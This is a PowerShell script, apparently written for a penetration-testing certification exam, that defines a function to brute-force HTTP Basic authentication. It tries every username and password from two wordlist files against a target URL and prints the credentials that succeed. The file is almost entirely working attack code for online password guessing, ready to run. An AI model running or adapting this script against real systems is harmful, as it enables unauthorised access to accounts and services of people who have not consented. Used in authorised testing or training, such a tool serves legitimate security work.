function BasicAuth-BruteForce
{

<#

.SYNOPSIS
A PowerShell script that Brute Force Basic authentication.

.DESCRIPTION
A PowerShell script that Brute Force Basic authentication using worldlist of usernames and passwords.

.PARAMETER UserList
Usernames List

.PARAMETER PassList
Passwords Lists

.PARAMETER Url
Url of a website uses Basic authentication.


.EXAMPLE
PS C:\> . .\BasicAuth-BruteForce.ps1
PS C:\> BasicAuth-BruteForce -Url http://192.168.1.111:8080 -UserList .\userlist.txt -PassList .\passlist.txt

.LINK
https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-credential?view=powershell-6

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam.
" http://www.securitytube-training.com/online-courses/powershell-for-pentesters/ "
Student ID: PSP - 3224

#>
    [CmdletBinding()] param(
    [parameter(Mandatory = $true)]
    [string]
    $UserList,

    [parameter(Mandatory = $true)]
    [String]
    $PassList,

    [parameter(Mandatory = $true)]
    [String]
    $Url
    
    )


    #silent errors
    $ErrorActionPreference = 'SilentlyContinue'

    #user and password list
    $usrlist = Get-Content $UserList
    $pwdlist = Get-Content $PassList


    #we labeled usernames loop so we can stop it directly from password loop
    :BruteForce
    foreach ($usr in $usrlist)
    {
        
         foreach ($pwd in $pwdlist)
            {
            # creating a credential object to hide prompting the user.
            $Secstr = ConvertTo-SecureString $pwd -AsPlainText -Force  
            $Pscreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $usr, $Secstr

            # requesting the web with user and password
            $req = Invoke-RestMethod -Uri $Url -Credential $Pscreds


            #check if successful login
            if ($req)
                {
                    Write-Host "Success username: $usr, password: $pwd" -ForegroundColor Green
                    #break the first loop (usernme)
                    break BruteForce
                }
            #check if failed login
            else
                {
                    Write-Host "faild username: $usr, password: $pwd" -ForegroundColor Red
                }

            }
     }
}